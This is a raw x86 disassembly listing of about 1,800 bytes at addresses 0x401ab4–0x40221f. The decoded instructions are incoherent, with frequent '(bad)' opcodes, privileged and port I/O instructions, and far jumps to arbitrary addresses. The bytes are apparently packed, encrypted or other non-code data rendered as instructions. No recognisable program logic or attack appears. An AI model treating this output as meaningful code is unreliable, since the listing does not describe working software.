  401ab4:	mov    esi,DWORD PTR ds:0x277dd3d0
  401aba:	cmp    DWORD PTR [edi+0x7d],edx
  401abd:	(bad)  
  401abe:	cmc    
  401abf:	mov    edi,0x91b268ac
  401ac4:	outs   dx,DWORD PTR ds:[esi]
  401ac5:	test   BYTE PTR [edi-0xf39f370],bl
  401acb:	sub    esi,eax
  401acd:	not    BYTE PTR [ecx-0x636e6f70]
  401ad3:	mov    cl,0x5b
  401ad5:	inc    eax
  401ad6:	pop    ds
  401ad7:	scas   eax,DWORD PTR es:[edi]
  401ad8:	data16 aad 0x0
  401adb:	push   esp
  401adc:	sub    eax,0x4a85fd6c
  401ae1:	sub    al,0xb9
  401ae3:	(bad)  
  401ae5:	outs   dx,DWORD PTR ds:[esi]
  401ae6:	cwde   
  401ae7:	sbb    ebx,ebx
  401ae9:	dec    eax
  401aea:	push   ecx
  401aeb:	mov    WORD PTR [ebp+0x7700f205],?
  401af1:	jb     0x401a97
  401af3:	sbb    esp,ebp
  401af5:	ss push ecx
  401af7:	jmp    0xf668946b
  401afc:	cli    
  401afd:	aaa    
  401afe:	stc    
  401aff:	xchg   DWORD PTR [edx+0x12],eax
  401b02:	call   0x657e67d8
  401b07:	aad    0x1d
  401b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b0a:	hlt    
  401b0b:	in     al,0x66
  401b0d:	repz or al,0xcb
  401b10:	mov    DWORD PTR [ebx],0xf0e798db
  401b16:	stc    
  401b17:	add    esp,ecx
  401b19:	add    esi,0x25260dde
  401b1f:	mov    dl,0xac
  401b21:	pop    ss
  401b22:	test   al,0x13
  401b24:	loope  0x401af0
  401b26:	(bad)  
  401b27:	lea    esi,[edi]
  401b29:	sub    BYTE PTR [edx-0x77bfc841],cl
  401b2f:	push   eax
  401b30:	ds cmc 
  401b32:	in     al,0x1c
  401b34:	sbb    al,0xa4
  401b36:	test   DWORD PTR [esi+0x2],edx
  401b39:	adc    esp,DWORD PTR [ebp-0x34]
  401b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b3d:	jecxz  0x401af2
  401b3f:	dec    esi
  401b40:	xchg   ebx,eax
  401b41:	add    al,0xfc
  401b43:	leave  
  401b44:	std    
  401b45:	inc    ebp
  401b46:	leave  
  401b47:	adc    al,0xf1
  401b49:	mov    eax,ds:0xe95cc16e
  401b4e:	push   fs
  401b50:	dec    ecx
  401b51:	ins    DWORD PTR es:[edi],dx
  401b52:	inc    esi
  401b53:	xchg   ebp,eax
  401b54:	pop    ebx
  401b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b56:	push   ss
  401b57:	xchg   edi,eax
  401b58:	aas    
  401b59:	adc    cl,BYTE PTR [ebp+edx*2+0x30502424]
  401b60:	stos   BYTE PTR es:[edi],al
  401b61:	popa   
  401b62:	xor    al,0xb1
  401b64:	add    al,BYTE PTR [ecx+edi*2]
  401b67:	jns    0x401aee
  401b69:	jae    0x401bb1
  401b6b:	add    DWORD PTR [esi],ebx
  401b6d:	pop    ebp
  401b6e:	and    al,0x4d
  401b70:	in     al,dx
  401b71:	mov    al,ds:0xdb3557ab
  401b76:	pop    esi
  401b77:	pusha  
  401b78:	iret   
  401b79:	stc    
  401b7a:	test   eax,0xa636ac4e
  401b7f:	xor    eax,0x5d11ef02
  401b84:	mov    DWORD PTR [ecx],esp
  401b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b87:	inc    esi
  401b88:	ret    0xa5bd
  401b8b:	stos   BYTE PTR es:[edi],al
  401b8c:	adc    DWORD PTR [ebp+0x15fe801d],ecx
  401b92:	(bad)  
  401b93:	pop    esi
  401b94:	cmp    eax,DWORD PTR [edi]
  401b96:	push   ebx
  401b97:	repz jg 0x401b25
  401b9a:	lea    ebx,[eax]
  401b9c:	cld    
  401b9d:	fsubr  DWORD PTR [esi-0x3a3e254f]
  401ba3:	pop    esi
  401ba4:	inc    ebp
  401ba5:	xor    dl,BYTE PTR [ebx-0x4a]
  401ba8:	adc    al,0x92
  401baa:	es jg  0x401bc2
  401bad:	mov    ebx,ss
  401baf:	sahf   
  401bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bb1:	jae    0x401c1f
  401bb3:	mov    dh,0x7b
  401bb5:	sti    
  401bb6:	test   cl,0x6f
  401bb9:	or     eax,0x7abdb7bd
  401bbe:	mov    cl,0xcb
  401bc0:	fs dec ebp
  401bc2:	mov    bl,ch
  401bc4:	pop    edx
  401bc5:	in     al,dx
  401bc6:	inc    ebx
  401bc7:	repz pop ebx
  401bc9:	pusha  
  401bca:	mov    edi,0xa901aad6
  401bcf:	cmp    ebp,eax
  401bd1:	sti    
  401bd2:	jl     0x401c14
  401bd4:	fnsave [edi-0x9c0795f]
  401bda:	shl    DWORD PTR [edi-0x1181d69f],1
  401be0:	push   edi
  401be1:	push   ecx
  401be2:	sbb    ch,0x4c
  401be5:	shr    BYTE PTR [ebx],0x5c
  401be8:	dec    edx
  401be9:	aas    
  401bea:	pusha  
  401beb:	retf   0x4015
  401bee:	es hlt 
  401bf0:	aam    0xe8
  401bf2:	pop    ds
  401bf3:	xchg   ebx,eax
  401bf4:	inc    ecx
  401bf5:	mov    esp,0x3003b651
  401bfa:	mov    edx,0x1ad0efda
  401bff:	hlt    
  401c00:	and    al,0x8b
  401c02:	inc    esp
  401c03:	xchg   DWORD PTR [ebp+0x409a1767],edi
  401c09:	push   ecx
  401c0a:	or     BYTE PTR [edi+eax*1],bh
  401c0d:	dec    esp
  401c0e:	jo     0x401b91
  401c10:	inc    ebp
  401c11:	cmp    al,0x8d
  401c13:	dec    ebp
  401c14:	lds    ebp,FWORD PTR ds:0xa2e77f21
  401c1a:	scas   al,BYTE PTR es:[edi]
  401c1b:	xor    edi,DWORD PTR [eax-0x356a4d73]
  401c21:	push   0x5526e676
  401c26:	ret    0xeb72
  401c29:	dec    BYTE PTR [edx-0x409bb2ba]
  401c2f:	or     DWORD PTR [esi],ebx
  401c31:	mov    ebp,0x308712a9
  401c36:	retf   
  401c37:	sub    BYTE PTR [ebx+ebx*2],0xe6
  401c3b:	mov    DWORD PTR [eax+ecx*8+0x7a],edi
  401c3f:	rol    DWORD PTR [edx-0x26],1
  401c42:	sahf   
  401c43:	push   ebx
  401c44:	push   ds
  401c45:	mov    al,0xc3
  401c47:	mov    cl,0x67
  401c49:	pop    es
  401c4a:	lea    edi,[esi]
  401c4c:	pop    ss
  401c4d:	pop    ss
  401c4e:	inc    esi
  401c4f:	jp     0x401cb3
  401c51:	outs   dx,DWORD PTR ds:[esi]
  401c52:	cmp    al,0xdc
  401c54:	inc    eax
  401c55:	bound  esi,QWORD PTR [eax+ebx*1]
  401c58:	out    dx,eax
  401c59:	aas    
  401c5a:	sbb    DWORD PTR [edx-0x37],edi
  401c5d:	dec    esi
  401c5e:	test   eax,0x6e030e90
  401c63:	lods   al,BYTE PTR ds:[esi]
  401c64:	sti    
  401c65:	mov    ah,0x25
  401c67:	or     DWORD PTR [ecx-0x294bfdef],edi
  401c6d:	(bad)  
  401c6e:	(bad)  
  401c6f:	pop    edi
  401c70:	test   BYTE PTR [ecx+eiz*4],ch
  401c73:	stos   DWORD PTR es:[edi],eax
  401c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c75:	pop    esp
  401c76:	sub    BYTE PTR [edi+0x7e4a677d],ah
  401c7c:	jl     0x401c2f
  401c7e:	mov    eax,ds:0x74400697
  401c83:	cmc    
  401c84:	dec    esi
  401c85:	outs   dx,DWORD PTR ds:[esi]
  401c86:	inc    eax
  401c87:	pop    esp
  401c88:	mov    eax,0x9da23239
  401c8d:	cmp    DWORD PTR [edx-0x483e1401],esp
  401c93:	iret   
  401c94:	arpl   WORD PTR [edi+0x32],cx
  401c97:	or     BYTE PTR [edx-0x1f],bh
  401c9a:	sbb    eax,0xc7fed05a
  401c9f:	and    BYTE PTR [esi+0x39809dd9],bh
  401ca5:	pop    ebx
  401ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ca7:	fwait
  401ca8:	loope  0x401c98
  401caa:	out    dx,al
  401cab:	sar    BYTE PTR [ebx-0x63],cl
  401cae:	and    ecx,ebx
  401cb0:	inc    edi
  401cb1:	or     al,BYTE PTR [eax+0x3]
  401cb4:	xchg   ebp,eax
  401cb5:	out    dx,al
  401cb6:	das    
  401cb7:	and    eax,0x606733b1
  401cbc:	pop    ebx
  401cbd:	aas    
  401cbe:	push   0xffffffbb
  401cc0:	cmp    al,0xf8
  401cc2:	bnd call DWORD PTR [edx+0x54057963]
  401cc9:	cmp    ebp,0x70
  401ccc:	jae    0x401d02
  401cce:	ret    
  401ccf:	je     0x401cf1
  401cd1:	pop    esi
  401cd2:	adc    WORD PTR [esi],0x50
  401cd6:	xlat   BYTE PTR ds:[ebx]
  401cd7:	in     al,dx
  401cd8:	sub    dh,cl
  401cda:	or     BYTE PTR [esi+0x34],ch
  401cdd:	mov    ebp,0x73fcd684
  401ce2:	push   ebx
  401ce3:	fiadd  WORD PTR [ecx]
  401ce5:	shl    DWORD PTR [esp+esi*8+0x7e36d550],0x7d
  401ced:	push   esi
  401cee:	push   ss
  401cef:	enter  0xa951,0xfc
  401cf3:	jbe    0x401d35
  401cf5:	scas   eax,DWORD PTR es:[edi]
  401cf6:	push   ebp
  401cf7:	test   BYTE PTR [edx+0x22],bl
  401cfa:	icebp  
  401cfb:	retf   0xfdbf
  401cfe:	mov    ebx,0xf3877062
  401d03:	in     al,dx
  401d04:	sbb    esi,DWORD PTR [ebx]
  401d06:	bound  ecx,QWORD PTR [esi]
  401d08:	push   edx
  401d09:	push   ds
  401d0a:	inc    ecx
  401d0b:	jecxz  0x401d45
  401d0d:	call   0x8d81:0xc5d1dc7a
  401d14:	xor    BYTE PTR [esi],cl
  401d16:	or     edx,DWORD PTR [esi+eiz*8+0x6b16a009]
  401d1d:	xchg   edi,eax
  401d1e:	in     eax,dx
  401d1f:	fcomp  DWORD PTR [edx+0x2e812f04]
  401d25:	mov    eax,0x8f199f90
  401d2a:	cmp    eax,ebx
  401d2c:	in     eax,dx
  401d2d:	mov    edi,0xa45d2612
  401d32:	daa    
  401d33:	mov    eax,esi
  401d35:	sahf   
  401d36:	test   BYTE PTR [edx],bh
  401d38:	int3   
  401d39:	sub    edx,edx
  401d3b:	test   DWORD PTR [edi],esp
  401d3d:	in     al,0xea
  401d3f:	icebp  
  401d40:	push   ebx
  401d41:	jmp    0xe220:0xe264083
  401d48:	je     0x401d71
  401d4a:	jmp    DWORD PTR [ecx]
  401d4c:	push   ebp
  401d4d:	sbb    al,0x4f
  401d4f:	push   cs
  401d50:	adc    dl,dl
  401d52:	inc    ebx
  401d53:	fs lahf 
  401d55:	or     BYTE PTR [ebp*1-0x2cdecc1a],bl
  401d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d5d:	in     al,0x1f
  401d5f:	push   eax
  401d60:	xchg   esi,eax
  401d61:	js     0x401d16
  401d63:	mov    ebx,0xeab6b68b
  401d68:	and    eax,0x26a753b3
  401d6d:	ss test al,0xcf
  401d70:	cld    
  401d71:	adc    DWORD PTR [ebx-0x30eaba61],edx
  401d77:	adc    al,BYTE PTR [edi-0x6a1933f7]
  401d7d:	cmp    bh,ah
  401d7f:	jo     0x401dad
  401d81:	push   cs
  401d82:	mov    BYTE PTR [ebp+0x6b],dl
  401d85:	add    al,BYTE PTR [ecx+0x5]
  401d88:	inc    esp
  401d89:	jp     0x401df4
  401d8b:	pushf  
  401d8c:	sub    edx,eax
  401d8e:	in     eax,dx
  401d8f:	in     al,0xf9
  401d91:	cmp    ebx,DWORD PTR [eax-0x75]
  401d94:	push   ss
  401d95:	jle    0x401d9b
  401d97:	mov    al,0xc8
  401d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d9a:	sbb    eax,0x2469070f
  401d9f:	scas   eax,DWORD PTR es:[edi]
  401da0:	(bad)  
  401da1:	loope  0x401d62
  401da3:	int    0x39
  401da5:	and    ch,BYTE PTR [ecx]
  401da7:	rol    BYTE PTR [esi+0x11],cl
  401daa:	bound  si,DWORD PTR [edi+0x3e]
  401dae:	mov    WORD PTR [ebx-0xb356494],cs
  401db4:	shr    eax,0x9a
  401db7:	lahf   
  401db8:	outs   dx,DWORD PTR ds:[esi]
  401db9:	xchg   esi,eax
  401dba:	adc    al,0xce
  401dbc:	repnz and eax,0xaee67d89
  401dc2:	retf   
  401dc3:	add    esp,DWORD PTR [ecx+0x4151a071]
  401dc9:	daa    
  401dca:	and    cl,cl
  401dcc:	push   ebx
  401dcd:	xchg   edi,eax
  401dce:	inc    ebx
  401dcf:	dec    ebp
  401dd0:	push   0x67c19a03
  401dd5:	adc    eax,0xdb89a590
  401dda:	add    DWORD PTR [edx+0x9b42f91],eax
  401de0:	loopne 0x401d99
  401de2:	mov    WORD PTR [esi],gs
  401de4:	loop   0x401e3a
  401de6:	add    al,BYTE PTR [ebp-0x357c73f5]
  401dec:	push   esp
  401ded:	xor    BYTE PTR [ebp+0x2fc500d3],0xc4
  401df4:	imul   BYTE PTR [ebp-0xb]
  401df7:	js     0x401e38
  401df9:	cmp    bl,BYTE PTR [ebx-0x363432c3]
  401dff:	xor    ecx,ebp
  401e01:	mov    ah,0xa6
  401e03:	ret    
  401e04:	fld    TBYTE PTR [ecx+0x35a7c889]
  401e0a:	ror    BYTE PTR [ecx-0x64889ca2],0xed
  401e11:	(bad)  
  401e14:	pop    esi
  401e15:	inc    eax
  401e16:	scas   eax,DWORD PTR es:[edi]
  401e17:	imul   edx,DWORD PTR [esi+0x7b63d0a7],0xe00dbe6b
  401e21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e22:	ja     0x401e8c
  401e24:	cmp    ebx,DWORD PTR [edx]
  401e26:	inc    ebp
  401e27:	xor    ebx,ebp
  401e29:	push   cs
  401e2a:	lods   al,BYTE PTR ds:[esi]
  401e2b:	mov    al,ds:0x8943e0a5
  401e30:	fld    QWORD PTR [edx]
  401e32:	ficomp DWORD PTR [esp+ebp*8]
  401e35:	jae    0x401ea9
  401e37:	mov    ch,0xd0
  401e39:	std    
  401e3a:	mov    esp,DWORD PTR [esi-0x66]
  401e3d:	lock add eax,0x39bb1dfd
  401e43:	dec    ebx
  401e44:	mov    ebx,0x76abd121
  401e49:	stos   BYTE PTR es:[edi],al
  401e4a:	mov    bl,0x3e
  401e4c:	mov    esi,0x56e4af46
  401e51:	pop    ds
  401e52:	cmp    DWORD PTR ds:0x5b868b72,ebp
  401e58:	mov    DWORD PTR ds:0x95bdaa1c,eax
  401e5e:	dec    edx
  401e5f:	xor    BYTE PTR [edx+0x60cc6e28],cl
  401e65:	inc    ebp
  401e66:	cmp    ecx,ecx
  401e68:	mov    edi,0x3d91c71e
  401e6d:	mov    dl,0x8b
  401e6f:	sub    DWORD PTR [edx+ebx*4+0x54],ecx
  401e73:	iret   
  401e74:	adc    ah,BYTE PTR [edx+0x993e355]
  401e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e7b:	scas   al,BYTE PTR es:[edi]
  401e7c:	and    BYTE PTR [ebp-0x27],dh
  401e7f:	cmp    edx,DWORD PTR [ecx]
  401e81:	test   eax,0xb50852ef
  401e86:	xchg   ebx,eax
  401e87:	loopne 0x401e95
  401e89:	adc    esi,DWORD PTR [ecx]
  401e8b:	sub    edx,DWORD PTR [esi-0x7c]
  401e8e:	push   0xf42731fa
  401e93:	cmp    ebp,DWORD PTR [edx-0x80]
  401e96:	push   esp
  401e97:	jno    0x401e5f
  401e99:	push   ebx
  401e9a:	push   ebp
  401e9b:	pop    ebx
  401e9c:	fcom   QWORD PTR [edi-0x31da65c0]
  401ea2:	mov    ah,ch
  401ea4:	retf   0xfe14
  401ea7:	or     BYTE PTR [edx],0xa5
  401eaa:	or     ebp,edi
  401eac:	xlat   BYTE PTR ds:[ebx]
  401ead:	fldz   
  401eaf:	and    eax,0xec2754c0
  401eb4:	cmp    eax,0xf76e9695
  401eb9:	outs   dx,DWORD PTR ds:[esi]
  401eba:	jne    0x401ec2
  401ebc:	jne    0x401e91
  401ebe:	loop   0x401eff
  401ec0:	in     al,0xf1
  401ec2:	jecxz  0x401eb0
  401ec4:	ins    DWORD PTR es:[edi],dx
  401ec5:	dec    edx
  401ec6:	cld    
  401ec7:	ret    0x9b93
  401eca:	pause  
  401ecc:	push   ds
  401ecd:	adc    edx,esi
  401ecf:	icebp  
  401ed0:	in     al,dx
  401ed1:	inc    eax
  401ed2:	add    bl,0xca
  401ed5:	shr    DWORD PTR [edi],1
  401ed7:	or     eax,0xf5c14f81
  401edc:	or     ecx,DWORD PTR [ecx+0xc9d1749]
  401ee2:	aaa    
  401ee3:	sar    ebp,0x43
  401ee6:	mov    eax,0x7941e059
  401eeb:	add    al,0x54
  401eed:	dec    ebp
  401eee:	adc    dl,BYTE PTR [ebx+0x46]
  401ef1:	and    BYTE PTR [ecx],ah
  401ef3:	inc    esp
  401ef4:	cli    
  401ef5:	dec    esp
  401ef6:	(bad)  
  401ef7:	pop    esi
  401ef8:	mov    dl,0x89
  401efa:	aas    
  401efb:	(bad)  
  401efc:	repz jb 0x401f38
  401eff:	scas   eax,DWORD PTR es:[edi]
  401f00:	add    DWORD PTR [ebx-0x6f],edi
  401f03:	inc    ebp
  401f04:	in     al,dx
  401f05:	rol    DWORD PTR [edi-0x7d9e5a79],0x4
  401f0c:	push   0x881e480b
  401f11:	cld    
  401f12:	sub    bh,bh
  401f14:	mov    esi,0x4de5bfb4
  401f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f1a:	mov    esp,0x6a18d5e9
  401f1f:	out    0x46,al
  401f21:	aaa    
  401f22:	push   ebx
  401f23:	mov    ch,BYTE PTR ds:0x14fb7748
  401f29:	adc    eax,0x3e2c7dcd
  401f2e:	mov    cl,BYTE PTR [esi]
  401f30:	dec    edx
  401f31:	lock test al,0x4e
  401f34:	pop    ds
  401f35:	cs call 0x7e30:0x68b3fd02
  401f3d:	jecxz  0x401f29
  401f3f:	js     0x401f2c
  401f41:	ins    BYTE PTR es:[edi],dx
  401f42:	inc    ebx
  401f43:	xchg   edi,eax
  401f44:	addr16 sub al,0xc6
  401f47:	dec    ebx
  401f48:	in     eax,dx
  401f49:	mov    ecx,0xeecf09c8
  401f4e:	inc    esi
  401f4f:	arpl   WORD PTR [ebp-0x74],si
  401f52:	pop    es
  401f53:	fnstenv [edi]
  401f55:	xchg   ebp,eax
  401f56:	jmp    0x5f822978
  401f5b:	mov    ah,0x2
  401f5d:	cmp    bh,BYTE PTR [ecx-0x6032f06c]
  401f63:	dec    esi
  401f64:	mov    esp,0x6c0568e
  401f69:	call   0xfbd582c6
  401f6e:	call   0x989:0x78ccb4b8
  401f75:	sar    bh,cl
  401f77:	scas   eax,DWORD PTR es:[edi]
  401f78:	lods   eax,DWORD PTR gs:[esi]
  401f7a:	jmp    0x401f82
  401f7c:	or     eax,DWORD PTR [eax+eax*4]
  401f7f:	mov    ch,0x74
  401f81:	repz rol bl,cl
  401f84:	dec    ebx
  401f85:	mov    bl,0x76
  401f87:	or     edx,DWORD PTR [ebx]
  401f89:	test   al,0x91
  401f8b:	outs   dx,BYTE PTR ds:[esi]
  401f8c:	add    BYTE PTR [ebp-0x3a07cb17],ah
  401f92:	jmp    0xa1fade63
  401f97:	jbe    0x401f70
  401f99:	adc    BYTE PTR [edx+0x1e544b63],0xef
  401fa0:	mov    edi,0x4a75bd5c
  401fa5:	arpl   di,ax
  401fa7:	push   esi
  401fa8:	mov    ah,0x1d
  401faa:	retf   0x9ed2
  401fad:	and    cl,BYTE PTR [esi+esi*2]
  401fb0:	rol    DWORD PTR [edx-0x260d1d1a],1
  401fb6:	mov    esp,0xc97d208f
  401fbb:	test   al,0x9f
  401fbd:	int3   
  401fbe:	arpl   WORD PTR [ebx-0x63d0613f],cx
  401fc4:	add    edi,DWORD PTR [edx]
  401fc6:	fs xchg dh,ah
  401fc9:	push   0x3e658bce
  401fce:	push   ds
  401fcf:	inc    ebx
  401fd0:	pop    edx
  401fd1:	fisub  DWORD PTR [edi]
  401fd3:	push   ecx
  401fd4:	adc    bh,BYTE PTR [edi-0x6d644f23]
  401fda:	sbb    dl,bl
  401fdc:	ins    DWORD PTR es:[edi],dx
  401fdd:	pushf  
  401fde:	adc    bl,BYTE PTR [ebx]
  401fe0:	aad    0xc8
  401fe2:	sbb    dh,ch
  401fe4:	mov    cl,0x5b
  401fe6:	adc    DWORD PTR gs:[eax-0x1c7375cc],edi
  401fed:	in     eax,0xb3
  401fef:	pushf  
  401ff0:	pop    es
  401ff1:	push   esi
  401ff2:	test   edx,0x17248728
  401ff8:	or     al,BYTE PTR [ebx-0x12]
  401ffb:	jne    0x401fe8
  401ffd:	xchg   edx,eax
  401ffe:	arpl   WORD PTR [esi+0x23],dx
  402001:	retf   
  402002:	jmp    0xc153fe52
  402007:	sti    
  402008:	mov    ch,0x31
  40200a:	pusha  
  40200b:	in     eax,dx
  40200c:	int3   
  40200d:	lods   al,BYTE PTR ds:[esi]
  40200e:	xchg   esp,eax
  40200f:	ds into 
  402011:	shl    ebx,0x33
  402014:	leave  
  402015:	sbb    eax,DWORD PTR [ecx+ecx*1+0x64]
  402019:	popa   
  40201a:	ins    BYTE PTR es:[edi],dx
  40201b:	mov    dh,0xb4
  40201d:	stc    
  40201e:	enter  0xf8b1,0xdb
  402022:	pop    ecx
  402023:	xchg   DWORD PTR ds:0x965144bd,edi
  402029:	sub    al,0x4b
  40202b:	leave  
  40202c:	sbb    al,0x5f
  40202e:	(bad)
  402032:	xchg   DWORD PTR [edi+ecx*4],esi
  402035:	jne    0x401fe3
  402037:	mov    ch,0x30
  402039:	mov    esi,ebx
  40203b:	sti    
  40203c:	mov    eax,ds:0x3038660b
  402041:	sbb    ch,BYTE PTR [edi+0x7e]
  402044:	push   esi
  402045:	push   ss
  402046:	push   esi
  402047:	sti    
  402048:	xor    al,0xc6
  40204a:	shl    BYTE PTR [edi],1
  40204c:	std    
  40204d:	inc    edx
  40204e:	pop    eax
  40204f:	pop    esp
  402050:	pop    es
  402051:	push   esi
  402052:	mov    dh,BYTE PTR [ebx]
  402054:	or     BYTE PTR [edx],al
  402056:	push   0xb4d0c132
  40205b:	ds out dx,eax
  40205d:	mov    bl,0xc0
  40205f:	pop    ebx
  402060:	cmp    cl,bh
  402062:	xchg   DWORD PTR [edx-0x6f5d6b02],edx
  402068:	mov    dh,0x7a
  40206a:	loope  0x40206b
  40206c:	jmp    0x40206d
  40206e:	add    ah,cl
  402070:	stos   BYTE PTR es:[edi],al
  402071:	cmp    BYTE PTR [ecx-0x8],0xfc
  402075:	and    BYTE PTR [ecx+esi*2],bh
  402078:	into   
  402079:	add    eax,0x2a6dafb3
  40207e:	and    BYTE PTR es:[ebx],dl
  402081:	xor    ch,bl
  402083:	push   esi
  402084:	pop    ds
  402085:	inc    eax
  402086:	neg    BYTE PTR [ecx]
  402088:	mov    WORD PTR ds:0x83c05e32,ds
  40208e:	hlt    
  40208f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402090:	lods   al,BYTE PTR ds:[esi]
  402091:	jmp    0x4020f4
  402093:	cld    
  402094:	ss dec ebx
  402096:	xchg   ecx,eax
  402097:	jecxz  0x4020f4
  402099:	retf   0x5f4
  40209c:	arpl   dx,si
  40209e:	sahf   
  40209f:	imul   ebp,DWORD PTR [esi-0x5429d5bf],0x29
  4020a6:	pop    ds
  4020a7:	iret   
  4020a8:	stos   BYTE PTR es:[edi],al
  4020a9:	jno    0x4020c6
  4020ab:	ins    BYTE PTR es:[edi],dx
  4020ac:	pushf  
  4020ad:	add    ah,BYTE PTR [ebx-0x1315942]
  4020b3:	xor    al,0x37
  4020b5:	xchg   esp,eax
  4020b6:	xchg   edi,eax
  4020b7:	lds    edi,FWORD PTR [edx]
  4020b9:	jmp    0x8de50cda
  4020be:	jnp    0x402120
  4020c0:	ret    0xd87c
  4020c3:	stos   DWORD PTR es:[di],eax
  4020c5:	out    dx,eax
  4020c6:	imul   edx,DWORD PTR [ecx+0x6],0x36
  4020ca:	(bad)  
  4020cb:	call   0x29097037
  4020d0:	dec    edi
  4020d1:	ss cld 
  4020d3:	mov    al,ds:0xb918ef62
  4020d8:	inc    esi
  4020d9:	nop
  4020da:	xchg   ebx,eax
  4020db:	retf   
  4020dc:	and    al,0x79
  4020de:	leave  
  4020df:	(bad)
  4020e2:	jbe    0x402154
  4020e4:	out    0xac,al
  4020e6:	xor    DWORD PTR [eax],edx
  4020e8:	dec    esp
  4020e9:	or     dl,BYTE PTR [ecx]
  4020eb:	loopne 0x402155
  4020ed:	rcr    DWORD PTR [edx+0x48],1
  4020f0:	gs je  0x40216e
  4020f3:	mov    BYTE PTR [ebx],dh
  4020f5:	pop    es
  4020f6:	ins    BYTE PTR es:[edi],dx
  4020f7:	pop    esp
  4020f8:	imul   ecx,ebp,0x4
  4020fb:	add    al,0x14
  4020fd:	mov    dl,0x71
  4020ff:	sbb    DWORD PTR [esi+0x12],ebp
  402102:	lods   eax,DWORD PTR ds:[esi]
  402103:	adc    dh,BYTE PTR [edx]
  402105:	pop    ss
  402106:	cmp    DWORD PTR [esi-0x6e],esp
  402109:	addr16 in eax,0xc6
  40210c:	test   al,0xb2
  40210e:	push   esi
  40210f:	jo     0x402175
  402111:	cs es jmp 0x9ff9:0x1d5bc657
  40211a:	iret   
  40211b:	and    al,0x85
  40211d:	loopne 0x402177
  40211f:	lods   al,BYTE PTR ds:[esi]
  402120:	inc    esp
  402121:	mov    DWORD PTR [edi],edi
  402123:	xor    al,0x69
  402125:	sbb    esi,DWORD PTR [edi-0x1e]
  402128:	cld    
  402129:	lds    eax,FWORD PTR [ecx]
  40212b:	pop    esi
  40212c:	nop
  40212d:	xacquire xchg DWORD PTR ss:[esi-0x1],ebx
  402132:	fs out 0x66,al
  402135:	outs   dx,DWORD PTR ds:[esi]
  402136:	push   0x1e
  402138:	out    dx,eax
  402139:	(bad)  
  40213a:	push   esi
  40213b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40213c:	(bad)  
  40213d:	pusha  
  40213e:	add    edx,esp
  402140:	inc    ecx
  402141:	xchg   ebp,eax
  402142:	aaa    
  402143:	and    esp,DWORD PTR ds:0x3f4c0baa
  402149:	call   0x6a2c1ac
  40214e:	out    dx,eax
  40214f:	cmp    bh,al
  402151:	push   cs
  402152:	in     eax,0xcd
  402154:	pop    esi
  402155:	inc    esi
  402156:	jle    0x402168
  402158:	cli    
  402159:	data16 loopne 0x402108
  40215c:	or     al,0x1e
  40215e:	dec    ecx
  40215f:	icebp  
  402160:	adc    dh,BYTE PTR cs:[edx+0xe]
  402164:	jp     0x40216e
  402166:	repz std 
  402168:	sbb    DWORD PTR [eax],0x1d01fad7
  40216e:	ja     0x4021c8
  402170:	inc    eax
  402171:	pop    ss
  402172:	scas   eax,DWORD PTR es:[edi]
  402173:	inc    edi
  402174:	shl    BYTE PTR [esi+0x4f79ab2],cl
  40217a:	cmp    dl,BYTE PTR [ebp+0x2efae841]
  402180:	sbb    eax,0xb115687b
  402185:	sub    ch,BYTE PTR [ebx-0x29e7e735]
  40218b:	jmp    0xd5bd:0x48b5ebe9
  402192:	sub    DWORD PTR [edi],esi
  402194:	sti    
  402195:	and    BYTE PTR [ebx-0x6c],ah
  402198:	sub    al,0x9d
  40219a:	cmp    ch,BYTE PTR [edi+0x1a282793]
  4021a0:	in     al,0x78
  4021a2:	iret   
  4021a3:	xor    eax,0x8215cb68
  4021a8:	jno    0x402192
  4021aa:	jl     0x402150
  4021ac:	scas   al,BYTE PTR es:[edi]
  4021ad:	mov    DWORD PTR [eax+0x6a],esi
  4021b0:	push   edi
  4021b1:	jo     0x402201
  4021b3:	jecxz  0x4021c6
  4021b5:	(bad)  
  4021b6:	sub    al,0x98
  4021b8:	iret   
  4021b9:	je     0x402144
  4021bb:	xor    al,0xc
  4021bd:	imul   edi,DWORD PTR [edi+0x3f],0xf526aae8
  4021c4:	test   DWORD PTR [edi-0x52],ebp
  4021c7:	sub    ebp,0x9cc01dd
  4021cd:	push   ss
  4021ce:	jae    0x40216e
  4021d0:	sti    
  4021d1:	jecxz  0x4021db
  4021d3:	inc    ebx
  4021d4:	jmp    0x57ef:0xe40f
  4021da:	lds    esi,FWORD PTR [eax]
  4021dc:	inc    esi
  4021dd:	imul   ebp,DWORD PTR [edi+ecx*2+0x38],0xffffff99
  4021e2:	jnp    0x4021ff
  4021e4:	inc    ebp
  4021e5:	ds dec edx
  4021e7:	cmp    BYTE PTR [esi+0x2],dh
  4021ea:	ret    
  4021eb:	das    
  4021ec:	popa   
  4021ed:	in     al,dx
  4021ee:	or     al,0xf7
  4021f0:	add    bh,BYTE PTR [ebx]
  4021f2:	loope  0x40223b
  4021f4:	lahf   
  4021f5:	cli    
  4021f6:	not    BYTE PTR [edx]
  4021f8:	cmp    DWORD PTR [ebx+0x7d],0x4b6b1eae
  4021ff:	sub    BYTE PTR [edi+0x7e],0x90
  402203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402204:	push   es
  402205:	mov    DWORD PTR [eax+eiz*4+0x1f],esp
  402209:	clc    
  40220a:	stos   DWORD PTR es:[edi],eax
  40220b:	push   ecx
  40220c:	or     BYTE PTR [ebx-0x75],0xf1
  402210:	mov    ds:0x846cffaf,eax
  402215:	cmp    edi,DWORD PTR [eax]
  402217:	arpl   WORD PTR [ecx],cx
  402219:	int    0xcf
  40221b:	outs   dx,DWORD PTR ds:[esi]
  40221c:	mov    al,0xb6
  40221e:	push   ecx
  40221f:	adc    eax,0x67e3de14
